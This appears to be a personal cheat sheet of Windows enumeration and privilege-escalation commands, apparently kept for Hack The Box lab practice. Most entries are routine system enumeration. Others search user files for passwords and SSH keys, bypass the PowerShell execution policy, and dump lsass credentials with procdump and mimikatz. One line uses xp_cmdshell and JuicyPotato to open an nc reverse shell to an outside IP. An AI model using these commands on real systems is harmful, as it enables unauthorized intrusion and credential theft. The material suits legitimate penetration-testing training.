```bash
xfreerdp /v:<target IP address> /u:htb-student /p:<password> 	# RDP to lab target
```
```bash
Get-WmiObject -Class win32_OperatingSystem 	Get information about the operating system
```
```bash
dir c:\ /a 	View all files and directories in the c:\ root directory
```
```bash
tree <directory> 	Graphically displaying the directory structure of a path
```
```bash
tree c:\ /f | more 	Walk through results of the tree command page by page
```
```bash
icacls <directory> 	View the permissions set on a directory
```
```bash
icacls c:\users /grant joe:f 	Grant a user full permissions to a directory
```
```bash
icacls c:\users /remove joe 	Remove a users' permissions on a directory
```
```bash
Get-Service 	PowerShell cmdlet to view running services
```
```bash
help <command> 	Display the help menu for a specific command
```
```bash
get-alias 	List PowerShell aliases
```
```bash
New-Alias -Name "Show-Files" Get-ChildItem 	Create a new PowerShell alias
```
```bash
Get-Module | select Name,ExportedCommands | fl 	View imported PowerShell modules and their associated commands
```
```bash
Get-ExecutionPolicy -List 	View the PowerShell execution policy
```
```bash
Set-ExecutionPolicy Bypass -Scope Process 	Set the PowerShell execution policy to bypass for the current session
```
```bash
wmic os list brief 	Get information about the operating system with wmic
```
```bash
Invoke-WmiMethod 	Call methods of WMI objects
```
```bash
whoami /user 	View the current users' SID
```
```bash
reg query <key> 	View information about a registry key
```
```bash
Get-MpComputerStatus 	Check which Defender protection settings are enabled
```
```bash
sconfig 	Load Server Configuration menu in Windows Server Core
```
```bash
whoami
whoami /priv
whoami /groups
systeminfo
```
### services + paths
Get-WmiObject win32_service | Select Name, StartName, PathName | Format-Table -AutoSize

### scheduled tasks
```bash
schtasks /query /fo LIST /v
```
### shares & SMB
```bash
net view
net use
Get-SmbShare
```
### ACLs (example)
```bash
icacls C:\ProgramData
```
### search for keys/creds
```bash
dir C:\Users\* -Recurse -Include *.rdp,*.config,*.xml,*.ini,*.txt -ErrorAction SilentlyContinue | Select -First 200
findstr /si /m "password" C:\Users\* 2>nul
```
```bash
echo %USERNAME%
set
```
```bash
Get-WmiObject win32_service | Select Name,StartName,PathName | Format-List
```
### or
```bash
wmic service get name,displayname,pathname,startname
```
### check a specific path
```bash
(Get-Acl "C:\\Program Files\\App\\app.exe").Access | Format-Table
```



### use accesschk (Sysinternals)
```bash
.\accesschk.exe -uwcqv Users C:\
```
```bash
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

```bash
dir C:\Users -Recurse -Include *.rdp,*.config,*.xml,*.ini,*.json,*.log,*.bak -ErrorAction SilentlyContinue
findstr /si /n "password" C:\Users\* 2>nul
```
### look for ssh keys
```bash
dir C:\Users\*\*.ssh\* -Recurse 2>nul
```

```bash
whoami /all
```
```bash
Get-SmbShare
net view \\target
crackmapexec smb <ip> -u '' -p ''  # if using CCE
```
-----------------------------------------------------------------------------------------
# Updating commands

## Finding file
```bash
dir <file> /s # recommended from C:\
```

## Network
```bash
ipconfig /all
arp -a
route print
```

## Windows Defender Status
```bash
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
## Tasks that is running
```bash
tasklist /svc
```
## Environment Variables in system
```bash
set
```
## View Detailed Configuration Information
```bash
systeminfo
wmic qfe # patches and updates
Get-HotFix | ft -AutoSize # as previous but PowerShell
wmic product get name # installed programs
Get-WmiObject -Class Win32_Product |  select Name, Version # as previous but PowerShell
```

## Running processes
```bash
netstat -ano # TCP and UDP connections in localhost
netstat -ano | findstr ":8080" # with find string which contains :8080
tasklist # using for cathing name of process recommended with findstr
```

## Logged-In Users && Current User && User Privileges && Groups
```bash
query user # all logged-in users
echo %USERNAME% # as whoami current user
whoami /priv # current user privileges
whoami /groups # current user group information
net user # get all users in system
net localgroup # get all groups in system
net localgroup <group> # can be administrators used for checking details about a group
net accounts # password policy and account info
```

## SQL Server with privileged user
```bash
impacket-mssqlclient <user>@<target_ip> -windows-auth # password required
# Comands in sql server after access
SQL> enable_xp_cmdshell # must enable this, stored procedure to run operating system commands
SQL> xp_cmdshell whoami # confirm working
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.65 9001 -e cmd.exe" -t *
# Starting reverse shell to your local machine by JuicyPotato but you may know that it is installed and running port(53375)
```

## SeDebugPrivilege
```bash
Computer Settings > Windows Settings > Security Settings # setting as admin
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# ^ dump process memory by procdump.exe and choosing lsass process because
# it stores creds after user log in system but can be anouther process
mimikatz.exe # see dumped creds form previous command
# commands into mimikatz
loglog
sekurlsa::minidump <file.dmp> # lsass.dmp
sekurlsa::logonpasswords # dumped creds
```
















